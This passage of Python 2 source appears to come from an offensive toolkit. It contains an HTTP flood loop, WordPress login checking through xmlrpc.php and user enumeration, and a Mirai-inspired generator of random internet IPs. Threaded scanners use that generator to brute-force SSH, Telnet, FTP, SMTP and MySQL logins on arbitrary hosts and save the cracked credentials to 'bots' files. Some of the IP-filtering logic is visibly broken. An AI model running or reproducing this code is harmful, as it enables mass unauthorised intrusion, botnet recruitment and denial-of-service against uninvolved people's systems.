     pa=random.choice(paths)
     try:
      g=random.randint(1,2)
      if g==1:
       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),u))
      else:
       q='q='
       for i in range(10,random.randint(20,50)):
        q+=random.choice(lis)
       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),u,q))
      d=s.recv(random.randint(1,3))
      if logs==True:
       print"Received: {}".format(d)
      if randomly==True:
       time.sleep(random.randint(start,end))
      if randomly==False:
       time.sleep(wait)
     except:
      break
    s.close()
  except Exception as e:
    pass
def wpadmin(u,path='/xmlrpc.php',username='',password='',timeout=10,proxy={}):
 '''
   this function is to check the wordpress given logins using the xmlrpc.php file. if they are correct it returns True, else False
'''
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 s=False
 u+=path
 post ="""<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>{}</value></param>
<param><value>{}</value></param>
</params>
</methodCall>""".format(username,password)
 try:
  r = requests.post(u, data=post,headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if "isAdmin" in r.text:
   s=True
 except:
  pass
 return s
def wpusers(u,path='/wp-json/wp/v2/users',timeout=10,boolean=False,link=False,content=True,proxy={}):
 '''
   this function is to get WP users
'''
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 s=''
 c=''
 b=False
 u+=path
 try:
  r=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if ('{"id":'in r.text) and('"name":"' in r.text):
   s+=u
   b=True
   c=r.text
 except Exception as e:
  pass
 if link==True:
  return s
 if boolean==True:
  return b
 if content==True:
  return c
def wpuser(u,path='/wp-json/wp/v2/users/',user=1,timeout=10,boolean=False,link=False,content=True,proxy={}):
 '''
   this function is to return all informations about a WP user with a given index integer
'''
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 s=''
 c=''
 b=False
 u+=path+str(user)
 try:
  r=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if ('{"id":'in r.text) and('"name":"' in r.text):
   s+=u
   b=True
   c+=r.text
 except Exception as e:
  pass
 if link==True:
  return s
 if boolean==True:
  return b
 if content==True:
  return c
def wpposts(u,path='/wp-json/wp/v2/posts',timeout=10,boolean=False,link=False,content=True,proxy={}):
 '''
   this function is to get WP posts
'''
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 s=''
 c=''
 b=False
 u+=path
 try:
  r=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if ('{"id":'in r.text) and('"date":"' in r.text):
   s+=u
   b=True
   c+=r.text
 except Exception as e:
  pass
 if link==True:
  return s
 if boolean==True:
  return b
 if content==True:
  return c
def wppost(u,path='/wp-json/wp/v2/posts/',post=1,timeout=10,boolean=False,link=False,content=True,proxy={}):
 '''
   this function is to return all informations about a WP post with a given index integer
'''
 if u[len(u)-1]=='/':
  u=u[0:len(u)-1]
 s=''
 c=''
 b=False
 u+=path+str(post)
 try:
  r=requests.get(u, headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout)
  if ('{"id":'in r.text) and('"date":"' in r.text):
   s+=u
   b=True
   c+=r.text
 except Exception as e:
  pass
 if link==True:
  return s
 if boolean==True:
  return b
 if content==True:
  return c
def getip():
 '''
   this function was inspired by the scanning file in mirai's source code to returns a safe IP to bruteforce.
'''
 d=[3,6,7,10,11,15,16,21,22,23,26,28,29,30,33,55,56,127,214,215]
 f=[100,169,172,198]
 while True:
  o1=random.randint(1,253)
  o2=random.randint(0,254)
  if (o1 not in d):
   if o1 in f:
    if ((o1==192)and(o2!=168)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if ((o2==172)and((o2<=16)and(o2>=32))):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==100)and(o2!=64)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==169)and (o2!=254)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
    if((o1==198)and(o2!=18)):
     return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
   else:
    return '{}.{}.{}.{}'.format(o1,o2,random.randint(0,255),random.randint(0,255))
'''
  the following functions are used to scan safe IPs all over the internet with a wordlist, it can scan bruteforce their: ftp, ssh, telnet, smtp and mysql logins then save them on text files in the same directory.
  it's highly recommended to be used with a VPS or your slow internet speed will be an obstacle to your scan.
'''
class iots(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,22))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if method==1:
       q=ssh1(ip,username=username,password=password)
      elif method==2:
       q=ssh2(ip,username=username,password=password)
      elif method==3:
       q=ssh3(ip,username=username,password=password)
      if q==True:
       ip+=':'+username+':'+password
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTssh(threads=100,meth=1,wl=wordlist,filename='sshbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global method
 method=meth
 global wordlist
 wordlist=wl
 for x in range(threads):
  t=iots().start()
class iott(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,23))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if method==1:
       q= telnet1(ip,username=username,password=password)
      elif method==2:
       q= telnet2(ip,username=username,password=password)
      if q==True:
       ip+=':'+username+':'+password
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTtelnet(threads=100,meth=1,wl=wordlist,filename='telnetbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global method
 method=meth
 global wordlist
 wordlist=wl
 for x in range(threads):
  iott().start()
class iotf1(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,21))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if ftp(ip,username=username,password=password)==True:
       ip+=':'+username+':'+password
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTftp(threads=100,meth=1,wl=wordlist,filename='ftpbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=wl
 for x in range(threads):
  iotf1().start()
class iotf2(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,21))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
     try:
      if ftpanon(ip)==True:
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTftpanon(threads=100,filename='ftpanonbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 for x in range(threads):
  iotf2().start()
class iotsm(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,25))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if smtp(ip,username=username,password=password)==True:
       ip+=':'+username+':'+password
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTsmtp(o,threads=100,wl=wordlist,filename='smtpbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global octet
 octet=o
 global wordlist
 wordlist=wl
 for x in range(threads):
  iotsm().start()
class iotmy(threading.Thread):
 def run(self):
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,3306))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
    for x in wordlist:
     try:
      username=x.split(':')[0]
      password=x.split(':')[1]
      if mysql(ip,username=username,password=password)==True:
       ip+=':'+username+':'+password
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTmysql(threads=100,wl=wordlist,filename='mysqlbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=wl
 for x in range(threads):
  iotmy().start()
class iotmy2(threading.Thread):
 def run(self):
  s=mysql
  while True:
   ip=getip()
   i=0
   try:
    so=socket.socket()
    so.settimeout(3)
    so.connect((ip,3306))
    i+=1
   except Exception as ex: 
    pass
   if i>0:
     try:
      if mysql(ip)==True:
       ip+=':root:'
       print ip
       write_file(ip,filen)
     except Exception as e: 
      pass
def IoTmysql2(threads=100,wl=wordlist,filename='mysqldefaultbots.txt'):
 create_file(filename)
 global filen
 filen=filename
 global wordlist
 wordlist=wl
 for x in range(threads):
  iotmy2().start()
def hydra(u,proto="ssh",p=22,wl=wordlist,logs=True,returning=False,mapping=False,timeout=5,ehlo=False,helo=True,ttls=False):
 '''
   this function is similar to hydra tool to bruteforce attacks on different ports.

   proto: (set by default to: ssh) set the chosen protocol (ftp, ssh, telnet, smtp and mysql) and don't forget to set the port.
'''
 o=''
 if (sys.platform == "win32") or( sys.platform == "win64"):
   if proto=="ssh":
    s=ssh2
   elif proto=="telnet":
    s=telnet2
 else:
   if proto=="ssh":
    s=ssh1
   elif proto=="telnet":
    s=telnet1
 if proto=="ftp":
  s=ftp
 if proto=="smtp":
  s=smtp
 if proto=="mysql":
  s=mysql
 for x in wl:
  user=x.split(':')[0].strip()
  pwd=x.split(':')[1].strip()
  if logs==True:
   print"[*]Trying: {}:{}".format(user,pwd)
  if proto=="mysql":
   r=s(u,user,pwd)
  elif proto=="ftp":
   r=s(u,username=user,password=pwd,timeout=timeout)
  elif proto=="smtp":
   r=s(u,p,username=user,password=pwd,ehlo=ehlo,helo=helo,ttls=ttls)
  else:
   r=s(u,p,username=user,password=pwd,timeout=timeout)
  if r==True:
   if logs==True:
    print"[+]Found!!!"
   if returning==True:
    o="{}:{}:{}".format(u,user,pwd)
   break
  else:
   if logs==True:
    print"[-]Failed"
 return o
def getdnsservers(version=0,proxy={},timeout=10):
 '''
   this function is to get public DNS servers. it returns a list.

   version: (set by default to: 0) 
   4: IPv4 servers
   6: IPv6 servers
   0: both versions

'''
 if version==0:
  try:
   r=requests.get('https://public-dns.info/nameservers.txt',headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
   return r.split('\n')
  except:
   pass
 elif version==4:
  try:
   l=[]
   r=requests.get('https://public-dns.info/nameservers.txt',headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
   for x in r.split('\n'):
    if '.' in x:
     l.append(x)
   return l
  except:
   pass
 elif version==6:
  try:
   l=[]
   r=requests.get('https://public-dns.info/nameservers.txt',headers = {'User-Agent': random.choice(ua)},proxies=proxy,timeout=timeout).text
   for x in r.split('\n'):
    if ':' in x:
     l.append(x)
   return l
  except:
   pass
